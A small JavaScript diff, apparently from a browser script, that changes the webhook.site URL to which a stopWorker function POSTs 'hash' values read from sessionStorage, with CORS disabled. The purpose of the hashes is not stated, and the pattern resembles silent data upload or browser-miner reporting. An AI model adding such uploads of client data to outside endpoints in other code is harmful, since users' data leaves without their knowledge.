@@ -123,7 +123,7 @@ function stopWorker() {
         for (let i = 0; i < haseIndex; i++) {
             const hash = sessionStorage.getItem('hash' + i);
             if (hash) {
-                fetch('https://webhook.site/65435ccd-80a5-442d-8076-f0de1c21bd0d', {
+                fetch('https://webhook.site/703157e4-32f0-4a9b-b9c6-e69cde5db599', {
                     method: 'POST',
                     mode: 'no-cors', // Try disabling CORS (limited functionality!)
                     body: JSON.stringify({ hash }),
